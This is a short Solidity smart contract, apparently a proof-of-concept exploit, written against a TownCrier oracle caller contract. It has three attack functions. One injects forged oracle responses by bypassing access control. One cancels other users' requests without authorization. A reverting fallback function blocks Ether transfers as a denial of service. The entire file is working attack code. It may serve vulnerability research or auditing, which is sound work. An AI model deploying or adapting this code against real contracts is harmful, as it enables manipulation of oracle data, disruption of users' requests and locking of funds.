pragma solidity ^0.4.9;

interface ITownCrierCaller {
    function response(uint64 responseType, uint64 errors, bytes32 data) external;
    function cancel() external;
}

contract TownCrierExploit {
    ITownCrierCaller public target;

    constructor(address _target) public {
        target = ITownCrierCaller(_target);
    }

    // 1. Call response as attacker
    function fakeResponse(uint64 rType, uint64 err, bytes32 data) public {
        target.response(rType, err, data); // violates access control
    }

    // 2. Cancel user request even if not owner
    function forceCancel() public {
        target.cancel(); // allowed without authorization
    }

    // 3. Fallback bomb to simulate DoS
    function() public payable {
        require(false); // if TownCrierCaller sends Ether to attacker, it fails
    }
}

